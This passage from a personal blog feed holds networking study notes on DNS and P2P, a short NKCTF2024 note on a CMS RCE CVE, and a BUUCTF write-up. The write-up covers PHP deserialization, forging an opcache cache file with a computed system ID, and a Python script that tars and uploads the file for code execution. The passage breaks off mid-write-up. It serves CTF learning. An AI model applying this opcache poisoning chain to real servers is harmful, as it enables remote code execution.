title="image-20240409115819761"><p>From和To是必须要有的</p><p>后面可能只有一个Subject首部行，也可能有其他多个可选的首部行</p><h3 id="邮件访问协议"><a href="#邮件访问协议" class="headerlink" title="邮件访问协议"></a>邮件访问协议</h3><p>目前流行的邮件访问协议：<strong>第三版邮局协议（Post Office Protocol–Version 3，POP3）</strong>，<strong>因特网邮件访问协议（Internet Mail Access Protocol，IMAP）</strong>，<strong>HTTP</strong></p><h2 id="DNS：因特网的目录服务"><a href="#DNS：因特网的目录服务" class="headerlink" title="DNS：因特网的目录服务"></a>DNS：因特网的目录服务</h2><h3 id="DNS提供的服务"><a href="#DNS提供的服务" class="headerlink" title="DNS提供的服务"></a>DNS提供的服务</h3><p>主机识别有两种方式：主机名和IP地址。用户一般偏好主机名，而路由器则偏好IP地址。为了折中两种不同的偏好，域名系统应运而生。</p><p><strong>域名系统（Domain Name System，DNS）</strong>：==一个由分层的DNS服务器实现的分布式数据库和一个使得主机能够查询分布式数据库的应用层协议。==DNS协议运行在UDP之上，使用53端口</p><p>以<code>http://www.example.com/path/to/sth</code>举例，看看用户主机如何获取URL的IP地址：</p><ol><li>某台用户主机上运行着DNS应用的客户端；</li><li>浏览器从该URL抽出主机名<code>www.example.com</code>，并将其传递给DNS应用的客户端；</li><li>DNS客户向DNS服务器发送一个包含主机名的请求；</li><li>DNS客户最终收到一份回答报文，报文包含对应于主机名的IP地址；</li><li>浏览器在接收到来自DNS的IP地址后，就向位于该IP地址80端口的HTTP服务器进程发起一个TCP连接</li></ol><p>除了进行主机名向IP地址转换外，DNS还提供其他一些重要服务：</p><h4 id="主机别名（host-aliasing）"><a href="#主机别名（host-aliasing）" class="headerlink" title="主机别名（host aliasing）"></a>主机别名（host aliasing）</h4><p>有的主机名长且复杂，原先的主机名叫<strong>规范主机名（canonical hostname）</strong>。为了方便记忆，这些主机都会有一个或多个<strong>主机别名</strong>。应用程序可以调用DNS来获得主机别名、对应的规范主机名和IP地址</p><h4 id="邮件服务器别名（mail-server-aliasing）"><a href="#邮件服务器别名（mail-server-aliasing）" class="headerlink" title="邮件服务器别名（mail server aliasing）"></a>邮件服务器别名（mail server aliasing）</h4><p>跟主机别名差不多，不赘述。</p><h4 id="负载分配（load-distribution）"><a href="#负载分配（load-distribution）" class="headerlink" title="负载分配（load distribution）"></a>负载分配（load distribution）</h4><p>此时的DNS用于冗余的服务器之间的负载分配。某个繁忙的站点被分布在多台服务器上，每台服务器运行在不同的端系统上，每个端系统都有不同的IP地址。这些冗余的服务器让一个IP地址集合与同一个规范主机名相联系，同时DNS数据库存储着这些IP地址的集合，因此当客户对映射到某地址集合的名字发出DNS请求，该服务器就用IP地址的整个集合进行响应，不过不同IP之间在响应时是有顺序的。</p><h3 id="DNS工作机理概述"><a href="#DNS工作机理概述" class="headerlink" title="DNS工作机理概述"></a>DNS工作机理概述</h3><p>这里就简单点说：</p><ol><li>用户主机的某应用程序需要将主机名转换为IP地址，调用DNS客户端，并指明需要被转换的主机名；</li><li>用户主机的DNS接收后向网络发送一个DNS查询报文；</li><li>经过一段时延后，用户主机上的DNS接收到一个提供希望映射的DNS回答报文；</li><li>映射结果传递到调用DNS的应用程序</li></ol><p>:::warning</p><p>所有的DNS请求和回答报文使用UDP数据报经过端口53发送</p><p>:::</p><h4 id="DNS的分布式设计"><a href="#DNS的分布式设计" class="headerlink" title="DNS的分布式设计"></a>DNS的分布式设计</h4><p>单一的DNS服务器虽然简单，但是出现的问题很多，包括但不限于：</p><ol><li><strong>单点故障（a single point of failure）</strong>：如果这个DNS服务器崩溃，那么整个因特网就会崩溃；</li><li><strong>通信容量（traffic volumn）</strong>：单个DNS服务器处理上亿个DNS查询显然不够；</li><li><strong>远距离的集中式数据库（distant centralized database）</strong>：单个DNS服务器是不可能位于所有用户的附近，若距离较远的用户向DNS服务器发送请求，那么可能会因为拥塞和低速的链路而导致很大的时延；</li><li><strong>维护（maintenance）</strong>：单个DNS服务必须要保留所有的因特网主机的记录，不仅会使数据库庞大，还需要为新主机的加入频繁更新。</li></ol><p>因此，DNS的分布式设计应运而生。</p><h5 id="分布式、层次数据库"><a href="#分布式、层次数据库" class="headerlink" title="分布式、层次数据库"></a>分布式、层次数据库</h5><p>为了解决扩展性问题，DNS使用了大量的DNS服务器，以层次方式组织，并且分布在全世界范围内。</p><p>这种方式一般有3种DNS服务器：==根DNS服务器，顶级域（Top-Level Domain，TLD）DNS服务器，权威DNS服务器。==</p><p>下图为部分DNS服务器的层次结构：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409153556448.png" class="" title="image-20240409153556448"><p>除了以上服务器之外，还有一类重要的DNS服务器称为<strong>本地DNS服务器（local DNS server）</strong>，虽然它不属于层次结构里面的任何服务器，但是对层次结构十分重要。</p><p>一台主机如何得知另一台主机的IP地址呢？</p><p>举个例子：（请求主机设为A，目标主机设为B）</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409154512745.png" class="" title="image-20240409154512745"><ol><li>主机A向它的本地DNS服务器发送一个DNS查询报文，报文包含了被转换的主机名B；</li><li>本地DNS服务器将报文转发给根DNS服务器；</li><li>根DNS服务器注意到主机A的edu前缀，然后向本地DNS服务器返回负责edu的TLD的IP地址列表；</li><li>本地DNS服务器再次向指定的TLD服务器之一发送报文；</li><li>TLD服务器注意到umass.edu的前缀，用权威DNS服务器的IP地址进行响应；</li><li>本地DNS服务器向权威DNS服务器重新发送报文；</li><li>权威DNS服务器用主机B的IP地址进行响应；</li><li>本地DNS服务器返回给主机A。</li></ol><p>这个步骤中总共发送了8篇报文。</p><p>:::info</p><p>上述例子利用了<strong>递归查询（recursive query）</strong>和<strong>迭代查询（iterative query）</strong>。</p><p>从主机到本地DNS服务器是递归查询，其余的均为迭代查询，因为所有的响应都是返回给本地DNS服务器的。</p><p>递归查询的例子如下图：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409160604713.png" class="" title="image-20240409160604713"><p>这是不是就相当于之前学的递归呢，例如斐波那契额数列，调用函数本身，最终的结果是函数本身返回的值。</p><p>:::</p><h5 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h5><p>相当于在本地DNS服务器添加了一个DNS缓存器，用于存储每一个接收到的回答，可以绕过根服务器，便于请求主机在请求相同的地址时可以直接返回该IP地址，节省了时间，也节省了资源。</p><h3 id="DNS记录和报文"><a href="#DNS记录和报文" class="headerlink" title="DNS记录和报文"></a>DNS记录和报文</h3><h4 id="资源记录（Resource-Record，RR）"><a href="#资源记录（Resource-Record，RR）" class="headerlink" title="资源记录（Resource Record，RR）"></a>资源记录（Resource Record，RR）</h4><p>资源记录提供了主机名到IP地址的映射。每一个DNS回答报文包含了一条或多条资源记录。</p><p>资源记录包含了以下四元组：==（Name，Value，Type，TTL）==</p><p>TTL是记录的生存时间，它决定了资源记录应当从缓存中删除的时间。Name和Value取决于Type：</p><ol><li>Type=A，则Name就是主机名，Value就是主机名对应的IP地址；</li><li>Type=NS，则Name就是域名（如<code>example.com</code>），Value就是权威DNS服务器的主机名（如<code>dns.example.com</code>）；</li><li>Type=CNAME，则Name就是域名，Value是与之对应的规范主机名；</li><li>Type=MX，则Name就是域名，Value是与之对应的邮件服务器的规范主机名</li></ol><h4 id="DNS报文"><a href="#DNS报文" class="headerlink" title="DNS报文"></a>DNS报文</h4><p>以下是DNS报文格式：</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409163119252.png" class="" title="image-20240409163119252"><p>先说说前12个字节首部区域：</p><ol><li>标识符是16比特的数，用于标识该查询。该标识符会被复制到对应的回答报文中，以便匹配发送的请求和收到的回答；</li><li>标志字段有若干个标志，1比特的”查询/回答“标志位指出报文是查询（0）还是回答（1）；当请求的是权威DNS服务器时，1比特的”权威“标志位会置于回答报文中；</li><li>如果客户在DNS服务器没有某记录时想要递归查询，那么报文就会设置1比特的“希望标志”位；</li><li>如果DNS服务器支持递归查询，那么回答报文中把1比特的“递归可用”标志位进行置位；</li><li>另外四个有关数量的字段，则指出了在首部后的4类数据区域出现的数量</li></ol><p>再说说后面的数据区域：</p><ol><li><strong>问题区域</strong>包含正在进行的查询信息，包括：（1）名字字段，包含正在被查询的主机名；（2）类型字段，指出有关该名字的正被询问的问题类型，例如是否与一个名字（A）或一个名字的邮件服务器（MX）相关联；</li><li><strong>回答区域</strong>包含了对最初请求的名字的资源记录（上面已经说过，不记得的可以去翻翻看）。在回答报文中的回答区域中可以包含多条RR，因此一个主机名能够有多个IP地址；</li><li><strong>权威区域</strong>包含了其他权威服务器的记录；</li><li><strong>附加区域</strong>包含了其他有帮助的记录。例如，一个MX请求的回答报文的回答区域包含了一条资源记录，该记录提供了邮件服务器的规范主机名。该附加区域包含一个类型A记录，该记录提供了用于该邮件服务器的规范主机名的IP地址。</li></ol><p>:::info no-icon</p><p><strong>nslookup程序</strong>能够做到让正在工作的主机直接向某些DNS服务器发送一个DNS查询报文。</p><p>:::</p><h2 id="P2P文件分发"><a href="#P2P文件分发" class="headerlink" title="P2P文件分发"></a>P2P文件分发</h2><p>根据书上例子，假设服务器要将一个文件分发给一个固定的对等方集合，其中服务器与对等方使用接入链路与因特网相连，如下图所示</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240410151402082.png" class="" title="image-20240410151402082"><p>设u<sub>s</sub>为服务器接入链路的上传速率，u<sub>i</sub>表示第i个对等方接入链路的上传速率，d<sub>i</sub>表示第i个对等方接入链路的下载速率，F表示被分发的文件长度（单位一般为bit），N表示对等方的数量，D<sub>cs</sub>是客户-服务器体系结构的分发时间。</p><p><strong>分发时间（distribution time）</strong>是所有N个对等方得到该文件的副本所需的时间。</p><p>为了排除影响，这里的环境假设为：因特网核心有足够的带宽（所以速率的瓶颈都在接入链路），服务器与客户没有参与任何其他网络应用（上传与下载的带宽能够全部用来发放该文件）</p><p>列出所求：</p><ol><li>由于服务器要传文件给N个对等方，因此上传文件的总量是NF bits，上传文件花费的总时间为NF / u<sub>s</sub>；</li><li>令d<sub>min</sub>表示所有对等方中最小的下载速率，因此d<sub>min</sub> = min{d<sub>1</sub>,d<sub>2</sub>,d<sub>3</sub>,……,d<sub>N</sub>}，这就导致有最小速率的对等方不能在F / d<sub>min</sub>内获取一个完整的文件，因此分发时间至少为F / d<sub>min</sub>；</li></ol><p>因此可以得到：</p><p>​                                                                                    ==D<sub>cs</sub> &gt;= max{NF / u<sub>s</sub>,F / d<sub>min</sub>}；==</p><p>不难看出，当N足够大时，客户-服务器分发时间就是由NF / u<sub>s</sub>来决定的。</p><p>接下来看一下P2P体系结构，条件不变，列出所求：</p><ol><li>开始分发时，由于只有服务器有文件，因此服务器至少要上传该文件1次，因此分发时间至少为F / u<sub>s</sub>（与前者有差别的是，服务器在分发一次文件后可以选择不用发送，因为该体系结构下可以通过其他对等方来分发该文件；</li><li>跟前者一样的是，有最小速率的对等方不能在F / d<sub>min</sub>内获取一个完整的文件，因此分发时间至少为F / d<sub>min</sub>；</li><li>在该体系结构下，系统整体的总上传能力等于服务器的上传速率加每个对等方的上传速率，即u<sub>total</sub> = u<sub>1</sub> + u<sub>2</sub> + … + u<sub>N</sub>;</li></ol><p>综上，设D<sub>P2P</sub>为P2P体系结构下的最小分发时间，得到</p><p>​                                                                                ==D<sub>P2P</sub> = max{F / u<sub>s</sub>,F / d<sub>min</sub>,NF / (u<sub>s</sub> + u<sub>total</sub>)}==</p><p>下图是两个结构的分发时间的变化趋势</p><img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240410154325767.png" class="" title="image-20240410154325767">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;应用层&quot;&gt;&lt;a href=&quot;#应用层&quot; class=&quot;headerlink&quot; title=&quot;应用层&quot;&gt;&lt;/a&gt;应用层&lt;/h1&gt;&lt;h2 id=&quot;应用层协议原理&quot;&gt;&lt;a href=&quot;#应用层协议原理&quot; class=&quot;headerlink&quot; title=&quot;应用层协议原理&quot;&gt;&lt;/a&gt;应用层协议原理&lt;/h2&gt;&lt;h3 id=&quot;网络应用程序体系架构&quot;&gt;&lt;a href=&quot;#网络应用程序体系架构&quot; class=&quot;headerlink&quot; title=&quot;网络应用程序体系架构&quot;&gt;&lt;/a&gt;网络应用程序体系架构&lt;/h3&gt;&lt;p&gt;应用程序体系结构（application architecture）由应用程序研发者设计，规定了如何在各种端系统上组织这个应用程序。&lt;/p&gt;
&lt;p&gt;目前的现代网络应用程序中一般会选择两种主流架构：==客户-服务器体系结构和对等（P2P）体系结构==&lt;/p&gt;
&lt;h4 id=&quot;客户-服务器体系结构&quot;&gt;&lt;a href=&quot;#客户-服务器体系结构&quot; class=&quot;headerlink&quot; title=&quot;客户-服务器体系结构&quot;&gt;&lt;/a&gt;客户-服务器体系结构&lt;/h4&gt;&lt;p&gt;服务器是一个==总是处于开机状态==的主机，它服务于来自许多其他称为&lt;strong&gt;客户&lt;/strong&gt;的主机的请求。&lt;/p&gt;
&lt;h5 id=&quot;特征&quot;&gt;&lt;a href=&quot;#特征&quot; class=&quot;headerlink&quot; title=&quot;特征&quot;&gt;&lt;/a&gt;特征&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;两个或多个客户之间是不会直接建立通信的；&lt;/li&gt;
&lt;li&gt;服务器具有固定的、周知的地址，即IP地址
    
    </summary>
    
    
      <category term="计网" scheme="http://luffys93.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
  </entry>
  
  <entry>
    <title>NKCTF2024</title>
    <link href="http://luffys93.github.io/2024/03/26/competition/202403/NKCTF2024/"/>
    <id>http://luffys93.github.io/2024/03/26/competition/202403/NKCTF2024/</id>
    <published>2024-03-26T03:47:02.000Z</published>
    <updated>2024-07-31T05:04:36.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="My-first-cms"><a href="#My-first-cms" class="headerlink" title="My first cms"></a>My first cms</h2><p>这题我要背锅，因为我顺着版本号找CVE结果找出来是个错家伙。我找的是CVE-2024-27625，但是题目出的是CVE-2024-27622…….:fearful:</p><p>不过在做的时候也是离谱，我开始猜测弱密码爆破是对的，结果被自己找的弱密码给坑了……:cold_sweat:</p><p>CVE-2024-27625是XSS攻击，CVE-2024-27622是远程RCE。</p><p>从一些漏洞情报的网站上看后得知，前者是因为开发者没有注意或者清理用户新建目录（不过更多是感觉没有做严格过滤），导致攻击者可以通过新建目录的字段植入恶意代码，从而引发持续性的XSS攻击；后者也是因为没有注意或者清理用户的输入，导致攻击者可以通过获取管理员权限来进行php代码的编写与执行。</p><p>反正，这道题特别简单。找个输入的地方然后写:horse:即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;My-first-cms&quot;&gt;&lt;a href=&quot;#My-first-cms&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="比赛" scheme="http://luffys93.github.io/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>buu做题记录（1）</title>
    <link href="http://luffys93.github.io/2024/03/20/buuctf/buu/"/>
    <id>http://luffys93.github.io/2024/03/20/buuctf/buu/</id>
    <published>2024-03-20T07:23:31.000Z</published>
    <updated>2024-07-31T08:37:01.232Z</updated>
    
    <content type="html"><![CDATA[<p>:::warning no-icon</p><p>做题记录如下</p><p><a href="https://luffys93.github.io/buuctf/buu/">buu1</a> -&gt; <a href="https://luffys93.github.io/buuctf/buu2/">buu2</a></p><p>:::</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php"><a href="#DASCTF-X-0psu3十一月挑战赛｜越艰巨·越狂热-single-php" class="headerlink" title="[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php"></a>[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php</h2><p>根据提示，可以传<code>LuckyE</code>变量，它的值可以试试<code>show_source</code></p><img src="/2024/03/20/buuctf/buu/image-20240320152718124.png" class="" title="image-20240320152718124"><p>看似是反序列化，但咱无法getshell，因为就算能够成功也只是执行函数</p><p>根据提示，进入siranai.php</p><p>发现是一个文件上传</p><span id="more"></span><img src="/2024/03/20/buuctf/buu/image-20240320153921982.png" class="" title="image-20240320153921982"><p>由于有对<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>的检测，所以直接抓包伪造绕过不太现实，只能考虑SSRF</p><p>分析后面代码，发现可以上传压缩包并且可以解压，但是它是放置在tmp目录下的临时文件，因此文件名注入命令行不通</p><p>可以考虑OPCACHE缓存文件来进行RCE（我并不会，因为听都没听过:sob:）</p><h3 id="啥是OPCACHE呢-confused"><a href="#啥是OPCACHE呢-confused" class="headerlink" title="啥是OPCACHE呢:confused:"></a>啥是OPCACHE呢:confused:</h3><p>它是一个PHP扩展，通过保存预编译的脚本字节码到共享内存中来提高PHP的执行效率，减少了每次加载和编译PHP脚本的开销</p><p>先进入到<code>phpinfo()</code>看看<code>opcache_file_cache_only</code>有没有开</p><p>反序列化脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span> = <span class="keyword">array</span>(<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为<code>O:6:&quot;siroha&quot;:1:&#123;s:3:&quot;koi&quot;;a:1:&#123;s:21:&quot;zhanjiangdiyishenqing&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</code></p><img src="/2024/03/20/buuctf/buu/image-20240320160403596.png" class="" title="image-20240320160403596"><p>相关设置是开着的，可以直接上手</p><h3 id="如何拉一个配置大致相同的镜像"><a href="#如何拉一个配置大致相同的镜像" class="headerlink" title="如何拉一个配置大致相同的镜像"></a>如何拉一个配置大致相同的镜像</h3><p>这里我们插入一段小插曲，因为这里对后面的解题很重要</p><p>官方的镜像<a href="https://github.com/docker-library/docs/blob/master/php/README.md#supported-tags-and-respective-dockerfile-links">在这里</a>，找到8.2.10就行（如果找不到可以问问gpt8.2.10镜像的名字是啥，不过一般都是php:版本号-cli）</p><p>dockerfile如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> php:<span class="number">8.2</span>.<span class="number">10</span>-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Opcache 扩展</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> docker-php-ext-install opcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置 Opcache</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> &#123; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.memory_consumption=128&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.interned_strings_buffer=8&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.max_accelerated_files=4000&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.revalidate_freq=2&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.fast_shutdown=1&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.enable_cli=1&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">&#125; &gt; /usr/local/etc/php/conf.d/opcache-recommended.ini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Opcache 缓存目录</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /var/www/cache/opcache &amp;&amp; <span class="built_in">chown</span> -R www-data:www-data /var/www/cache/opcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自定义配置文件，这样就可以不用修改php.ini了</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> opcache.ini <span class="variable">$PHP_INI_DIR</span>/conf.d/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;php&quot;</span>, <span class="string">&quot;-S&quot;</span>, <span class="string">&quot;0.0.0.0:8000&quot;</span> ]</span></span><br></pre></td></tr></table></figure><p>opcache.ini文件如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcache.enable=1</span><br><span class="line">opcache.file_cache_only=1</span><br><span class="line"># 指定缓存目录</span><br><span class="line">opcache.file_cache=/var/www/cache/opcache</span><br></pre></td></tr></table></figure><p>同目录下可以写一个内容为<code>&lt;? phpinfo();?&gt;</code>的index.php，这样可以方便查看需要的功能有没有打开之类的</p><p>:::warning</p><p>打开opcache后必须要指定缓存目录，否则容器会启动失败</p><p>:::</p><p>做完这些后直接跑docker，看看能否正常运行</p><img src="/2024/03/20/buuctf/buu/image-20240321134049931.png" class="" title="image-20240321134049931"><p>ok，可以进入容器内部寻找我们需要的东西了</p><img src="/2024/03/20/buuctf/buu/image-20240321134316132.png" class="" title="image-20240321134316132"><p>这里index.php.bin文件是index.php的编译缓存，作用前面说过，不多赘述</p><p>我们先看看题目上的时间戳是多少</p><img src="/2024/03/20/buuctf/buu/image-20240321135643874.png" class="" title="image-20240321135643874"><p>然后转换为十六进制，把文件拖入010改一下</p><img src="/2024/03/20/buuctf/buu/image-20240321135618245.png" class="" title="image-20240321135618245"><h3 id="怎么计算systemid"><a href="#怎么计算systemid" class="headerlink" title="怎么计算systemid"></a>怎么计算systemid</h3><p>先说说为什么要计算systemid</p><p>:::danger no-icon</p><p>计算 System ID 通常是为了确保攻击者生成的恶意 Opcache 缓存文件与目标系统的 Opcache 配置兼容。每个系统的  Opcache 配置可能不同，包括文件路径、权限等，而 System ID 可能被用作确保缓存文件与特定系统设置相匹配的一种方式。</p><p>:::</p><p>根据其他博客和官方wp，大致可以得出systemid有以下几部分</p><ol><li>PHP Version</li><li>Zend Extension ID</li><li>Zend Bin ID</li></ol><p>php的官方源码中也有，可以去看看<code>zend_system_id.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">zend_startup_system_id</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">PHP_MD5Init(&amp;context);</span><br><span class="line">PHP_MD5Update(&amp;context, PHP_VERSION, <span class="keyword">sizeof</span>(PHP_VERSION)<span class="number">-1</span>);</span><br><span class="line">PHP_MD5Update(&amp;context, ZEND_EXTENSION_BUILD_ID, <span class="keyword">sizeof</span>(ZEND_EXTENSION_BUILD_ID)<span class="number">-1</span>);</span><br><span class="line">PHP_MD5Update(&amp;context, ZEND_BIN_ID, <span class="keyword">sizeof</span>(ZEND_BIN_ID)<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(PHP_VERSION, <span class="string">&quot;-dev&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Development versions may be changed from build to build */</span></span><br><span class="line">PHP_MD5Update(&amp;context, __DATE__, <span class="keyword">sizeof</span>(__DATE__)<span class="number">-1</span>);</span><br><span class="line">PHP_MD5Update(&amp;context, __TIME__, <span class="keyword">sizeof</span>(__TIME__)<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">zend_system_id[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由题目可知</p><p>PHP Version = 8.2.10，Zend Extension ID = API420220829,NTS，Zend Bin ID = BIN_48888</p><p>实际上可以用一个工具，<a href="https://github.com/GoSecure/php7-opcache-override">php7-opcache-override-master</a></p><img src="/2024/03/20/buuctf/buu/image-20240321152802802.png" class="" title="image-20240321152802802"><p>得出systemid后，就可以生成一个tar压缩包了</p><p>在题目的<code>phpinfo()</code>我们可以看到系统指定的缓存目录为/tmp，这里就用python来SSRF了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">sys_id = <span class="string">&#x27;00c2d2752120e3de9b90bf0eb5fcfcb9&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.TarInfo(name=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.<span class="built_in">type</span> = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">        tar.addfile(directory_info)</span><br><span class="line"></span><br><span class="line">        tar.add(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tar_file()</span><br><span class="line">url = <span class="string">&#x27;http://b6361428-f413-4d94-b4d3-0d5932e326ca.node5.buuoj.cn:81/?LuckyE=show_source&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.post(url=url,files=file)</span><br><span class="line">    <span class="built_in">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">request_content = upload()</span><br><span class="line">upload_body = <span class="built_in">str</span>(request_content.body).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(content_length)</span><br><span class="line"><span class="built_in">print</span>(upload_body)</span><br></pre></td></tr></table></figure><img 